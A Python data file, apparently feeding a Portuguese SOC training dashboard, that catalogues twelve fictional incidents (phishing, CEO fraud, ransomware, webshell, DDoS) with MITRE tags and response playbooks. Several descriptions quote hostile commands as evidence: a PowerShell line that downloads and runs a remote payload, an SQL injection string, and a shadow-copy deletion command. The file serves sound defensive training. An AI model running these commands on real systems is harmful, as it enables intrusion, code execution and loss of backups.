"""
scenario_data.py — Catálogo de incidentes e cenários de ataque para demonstração do SOC.

CENARIOS: 12 ameaças individuais (guia INCIBE adaptado ao contexto de uma PME portuguesa),
          usadas por demo_incidentes.py (CLI) e por /api/scenarios (dashboard).
ATTACK_SCENARIOS: agrupamentos narrativos de CENARIOS para uma apresentação guiada,
          combinando vários incidentes relacionados numa única história de ataque.
"""

# ── 12 cenários de ataque ──────────────────────────────────────────────────────

CENARIOS = [

    # 0 — Fuga de informação (TA0009 · TA0010 · TA0006)
    {
        "type": "data_exfiltration",
        "severity": "ALTA",
        "description": (
            "FUGA DE INFORMAÇÃO — Colaborador do departamento de RH copiou para USB "
            "mais de 800 MB de ficheiros com dados pessoais de colaboradores "
            "(RGPD — categorias especiais). O sistema DLP detetou escrita massiva "
            "para dispositivo removível fora do horário laboral. "
            "MITRE: T1567 Exfiltration Over Web Service · T1052 Exfiltration Over Physical Medium. "
            "Ativo: Workstation RH-01 (192.168.2.40). "
            "Utilizador: luisa.pinto@empresa.pt. "
            "Potencial violação de dados — notificação CNPD ≤ 72h pode ser exigida."
        ),
        "source_ip": "192.168.2.40",
        "mitre": ["TA0009", "TA0010", "TA0006"],
        "playbook": "PB-006",
        "hitl_note": "HITL obrigatório — avaliar dados pessoais e obrigações RGPD",
    },

    # 1 — Phishing (TA0001 · TA0006 · TA0043)
    {
        "type": "phishing",
        "severity": "ALTA",
        "description": (
            "PHISHING — Email recebido por 7 colaboradores, aparentemente da CGD "
            "('seguranca@cgd-online.pt'), solicitando atualização urgente de credenciais. "
            "Link aponta para 'cgd-onllne.pt' (typosquatting — diferença de 1 carácter). "
            "2 colaboradores clicaram; 1 submeteu credenciais. "
            "SPF/DKIM/DMARC em falha. "
            "MITRE: T1566.002 Spearphishing Link · T1656 Impersonation · T1598 Phishing for Information."
        ),
        "source_ip": "91.228.135.17",
        "url": "http://cgd-onllne.pt/secure/atualizar",
        "mitre": ["TA0001", "TA0006", "TA0043"],
        "playbook": "PB-002",
        "hitl_note": "HITL — confirmar se credenciais foram submetidas; decidir reset e claw-back",
    },

    # 2 — Fraude do CEO / BEC (TA0001 · TA0006 · TA0040)
    {
        "type": "account_compromise",
        "severity": "CRITICA",
        "description": (
            "FRAUDE DO CEO (BEC) — Email recebido no Financeiro com From: 'Carlos Moura <carlos.moura@empresa-pt.com>' "
            "(domínio look-alike; corporativo é empresa.pt). "
            "Pedido urgente e confidencial de transferência de 18.500 € para 'fornecedor estratégico' "
            "em conta IBAN PT50 0010 0000 5051 1113 7019 3 (banco Lituânia). "
            "Diretor estava em viagem — tentou-se verificar por telefone, sem resposta inicial. "
            "Reply-To diferente do From. "
            "MITRE: T1566 Spearphishing · T1656 Impersonation · T1534 Internal Spearphishing."
        ),
        "source_ip": "185.220.101.42",
        "mitre": ["TA0001", "TA0006", "TA0040"],
        "playbook": "PB-007",
        "hitl_note": "HITL IMEDIATO — congelar pagamento; verificar por telefone direto ao diretor",
    },

    # 3 — Fraude de RH / IBAN (TA0001 · TA0040)
    {
        "type": "account_compromise",
        "severity": "ALTA",
        "description": (
            "FRAUDE DE RH — Email recebido no departamento de RH aparentemente de "
            "'andrefonseca@empresa.pt.net' (domínio falso — 1 carácter extra). "
            "Pedido de alteração do IBAN de salário para PT50 0033 0000 4523 1197 1050 5 "
            "antes do próximo processamento salarial. "
            "Colaborador André Fonseca confirmou NÃO ter enviado o email. "
            "MITRE: T1656 Impersonation · T1566 Phishing · T1598 Phishing for Information. "
            "Alteração bloqueada a tempo."
        ),
        "source_ip": "194.165.16.11",
        "mitre": ["TA0001", "TA0040"],
        "playbook": "PB-008",
        "hitl_note": "HITL — bloquear alteração; implementar aprovação dupla para IBAN no RH",
    },

    # 4 — Sextorsão (TA0040 · TA0001)
    {
        "type": "other",
        "severity": "MEDIA",
        "description": (
            "SEXTORSÃO — Campanha de sextorsão recebida por 4 colaboradores. "
            "Remetente falsificado (From = própria conta) com SPF fail. "
            "Afirma ter captado vídeo comprometedor via malware; exige 0.085 BTC "
            "para carteira 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf Na. "
            "Email inclui password antiga do utilizador (origem: breach de 2021 — HaveIBeenPwned). "
            "Verificação no endpoint não encontrou qualquer RAT ou malware ativo. "
            "MITRE: T1657 Financial Theft · T1566 Phishing · T1589 Gather Victim Identity Information."
        ),
        "source_ip": "45.142.212.100",
        "mitre": ["TA0040", "TA0001"],
        "playbook": "PB-009",
        "hitl_note": "HITL — comunicar aos utilizadores que é fraude; verificar passwords comprometidas",
    },

    # 5 — Ataque à web corporativa (TA0001 · TA0002 · TA0040)
    {
        "type": "intrusion",
        "severity": "CRITICA",
        "description": (
            "ATAQUE WEB CORPORATIVA — WAF detetou injeção SQL no parâmetro 'id' da área de clientes "
            "('empresa.pt/clientes?id=1 OR 1=1--'). "
            "Após exploração bem-sucedida foi instalada webshell em '/wp-content/cache/session.php'. "
            "FIM detetou criação do ficheiro .php pelo processo httpd. "
            "Possível exfiltração de base de dados de clientes (names, emails, NIF). "
            "MITRE: T1190 Exploit Public-Facing Application · T1505.003 Web Shell · T1491.002 External Defacement. "
            "Servidor: web-srv-01 (192.168.1.11)."
        ),
        "source_ip": "103.251.167.20",
        "url": "http://empresa.pt/clientes?id=1 OR 1=1--",
        "mitre": ["TA0001", "TA0002", "TA0040"],
        "playbook": "PB-010",
        "hitl_note": "HITL URGENTE — isolar servidor; avaliar exposição de dados pessoais (CNPD 72h)",
    },

    # 6 — Ransomware (TA0002 · TA0008 · TA0040)
    {
        "type": "ransomware",
        "severity": "CRITICA",
        "description": (
            "RANSOMWARE — EDR detetou processo 'svchost_update.exe' a cifrar ficheiros em massa "
            "com extensão '.locked' na workstation ws-com-03 (192.168.2.52). "
            "Comando vssadmin delete shadows /all /quiet executado 2 min antes. "
            "Nota de resgate 'READ_ME_RANSOM.txt' criada em 14 directorias partilhadas. "
            "Propagação via SMB para NAS (192.168.1.10) em curso — 3 partilhas afetadas. "
            "Hash: a3f2e8c1d4b7f9e2a5c8d1b4e7f0c3a6. "
            "MITRE: T1486 Data Encrypted for Impact · T1490 Inhibit System Recovery · T1021.001 RDP."
        ),
        "source_ip": "192.168.2.52",
        "hash": "a3f2e8c1d4b7f9e2a5c8d1b4e7f0c3a6",
        "mitre": ["TA0002", "TA0008", "TA0040"],
        "playbook": "PB-003",
        "hitl_note": "HITL CRÍTICO — isolar TODA a rede; decidir restauro de backup vs. desencriptação",
    },

    # 7 — Falso suporte da Microsoft (TA0001 · TA0002 · TA0011)
    {
        "type": "malware",
        "severity": "ALTA",
        "description": (
            "FALSO SUPORTE MICROSOFT — Colaborador do Comercial recebeu chamada de 'técnico Microsoft' "
            "após browser mostrar pop-up de erro falso (adware). "
            "Instalou AnyDesk (anydesk.exe) a pedido do 'técnico'. "
            "EDR detetou ligação remota de saída para 91.92.136.45:7070 logo após instalação. "
            "O 'técnico' teve acesso ao browser e à app bancária durante ~12 minutos. "
            "MITRE: T1219 Remote Access Software · T1656 Impersonation · T1204 User Execution. "
            "Equipamento: lt-com-01 (192.168.2.50). Utilizador: miguel.rodrigues."
        ),
        "source_ip": "91.92.136.45",
        "port": 7070,
        "mitre": ["TA0001", "TA0002", "TA0011"],
        "playbook": "PB-011",
        "hitl_note": "HITL — verificar operações bancárias; mudar todas as credenciais do equipamento",
    },

    # 8 — Email com malware / macro VBA (TA0001 · TA0002 · TA0005)
    {
        "type": "malware",
        "severity": "ALTA",
        "description": (
            "EMAIL COM MALWARE — Email com assunto 'Fatura Vencida #2026-0847' recebido por 3 colaboradores "
            "com anexo 'Fatura_2026.xlsm' (macro VBA). "
            "Colaborador do Financeiro ativou macros; WINWORD.EXE criou processo filho powershell.exe "
            "que executou: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.99/payload'). "
            "Hash do ficheiro: 5d41402abc4b2a76b9719d911017c592. "
            "Beacon C2 detetado para 185.220.101.99:443. "
            "MITRE: T1566.001 Spearphishing Attachment · T1204.002 Malicious File · T1059.005 VBA."
        ),
        "source_ip": "185.220.101.99",
        "hash": "5d41402abc4b2a76b9719d911017c592",
        "url": "http://185.220.101.99/payload",
        "port": 443,
        "mitre": ["TA0001", "TA0002", "TA0005"],
        "playbook": "PB-012",
        "hitl_note": "HITL — isolar equipamento; bloquear C2; purgar campanha de email",
    },

    # 9 — DDoS (TA0040)
    {
        "type": "ddos",
        "severity": "ALTA",
        "description": (
            "DDOS — Ataque de negação de serviço volumétrico contra servidor web da empresa. "
            "Fluxo de tráfego de entrada: 3.2 Gbps (baseline normal: 12 Mbps). "
            "Origem: botnet distribuída em 47 países (predominância RU, BR, CN). "
            "Tipo: UDP flood + DNS amplification (factor 50x). "
            "Site 'empresa.pt' indisponível há 18 minutos; email externo também afetado. "
            "MITRE: T1498 Network Denial of Service · T1498.001 Reflection Amplification. "
            "Contactar ISP para upstream filtering; ativar CDN/scrubbing center."
        ),
        "source_ip": "45.141.84.120",
        "port": 53,
        "mitre": ["TA0040"],
        "playbook": "PB-005",
        "hitl_note": "HITL — ativar mitigação CDN/ISP; comunicar impacto aos clientes e stakeholders",
    },

    # 10 — Adware / Malvertising (TA0002 · TA0003 · TA0001)
    {
        "type": "malware",
        "severity": "MEDIA",
        "description": (
            "ADWARE / MALVERTISING — Equipamento ws-mkt-01 (Vera Sousa, Marketing) apresenta "
            "redirecionamentos persistentes do browser e pop-ups publicitários. "
            "EDR identificou extensão não corporativa instalada: 'PDF Converter Pro' (ID: mhjfbmdgcfjbbpaeojofohoefgiehjai). "
            "Fonte: repositório externo (não Chrome Web Store oficial). "
            "Tráfego DNS para 'ads-tracking-cdn.net' (categoria: malvertising — bloqueado pelo proxy). "
            "Sem evidência de C2 adicional. "
            "MITRE: T1176 Browser Extensions · T1189 Drive-by Compromise · T1204 User Execution."
        ),
        "source_ip": "192.168.2.70",
        "url": "http://ads-tracking-cdn.net",
        "mitre": ["TA0002", "TA0003", "TA0001"],
        "playbook": "PB-013",
        "hitl_note": "COND. — remover extensão; scan completo; rever política de extensões",
    },

    # 11 — Suplantação de fornecedor (TA0001 · TA0040)
    {
        "type": "other",
        "severity": "CRITICA",
        "description": (
            "SUPLANTAÇÃO DE FORNECEDOR — Email de 'faturacao@tecnologias-acme.pt.com' "
            "(fornecedor real: tecnologias-acme.pt — domínio extra '.com'). "
            "Fatura #2026-0412 de 9.750 € com pedido de pagamento para IBAN alterado: "
            "PT50 0045 0000 3523 8117 5050 1 (banco Chipre). "
            "Thread hijacking confirmado: email aparece em reply à conversa legítima de junho. "
            "Pagamento ainda não processado — contas a pagar aguardava aprovação do responsável. "
            "MITRE: T1656 Impersonation · T1657 Financial Theft · T1566 Phishing · T1199 Trusted Relationship."
        ),
        "source_ip": "193.105.134.55",
        "mitre": ["TA0001", "TA0040"],
        "playbook": "PB-014",
        "hitl_note": "HITL IMEDIATO — congelar pagamento; ligar ao fornecedor por número CONHECIDO",
    },
]


# ── Cenários de ataque narrativos (agrupam vários CENARIOS por tema) ───────────
# Cada um é lançável a partir do dashboard (tab "Cenários"): gera todos os
# incidentes do grupo de uma vez, faz surgir os playbooks corretos e gera
# missões de formação + (quando aplicável) uma campanha de phishing.

ATTACK_SCENARIOS = [
    {
        "id": "SCN-BEC",
        "name": "Fraude Financeira & Business Email Compromise",
        "description": (
            "Uma campanha de phishing inicial evolui para fraude do CEO, fraude de RH e "
            "suplantação de fornecedor — testa a resiliência do Financeiro e do RH a ataques "
            "de engenharia social com impacto financeiro direto."
        ),
        "incident_indices": [1, 2, 3, 11],
    },
    {
        "id": "SCN-INTRUSION",
        "name": "Intrusão Técnica & Ransomware",
        "description": (
            "Exploração de uma vulnerabilidade na aplicação web corporativa, seguida de "
            "propagação lateral de ransomware pela rede interna."
        ),
        "incident_indices": [5, 6],
    },
    {
        "id": "SCN-SOCIAL",
        "name": "Engenharia Social no Posto de Trabalho",
        "description": (
            "Colaboradores são alvo de uma burla de falso suporte técnico, de um email "
            "malicioso e de adware — testa a formação em segurança do dia-a-dia."
        ),
        "incident_indices": [7, 8, 10],
    },
    {
        "id": "SCN-MISC",
        "name": "Fuga de Dados, Extorsão & Disponibilidade",
        "description": (
            "Fuga de dados pessoais por um insider, tentativa de extorsão por email e ataque "
            "de negação de serviço — três ameaças distintas ao negócio."
        ),
        "incident_indices": [0, 4, 9],
    },
    {
        "id": "SCN-FULL",
        "name": "Simulação Completa (12 Ameaças INCIBE)",
        "description": (
            "Todos os 12 cenários de ataque — simulação completa para uma demonstração "
            "integral do pipeline L1→L6, dos playbooks e da formação gamificada."
        ),
        "incident_indices": list(range(12)),
    },
]
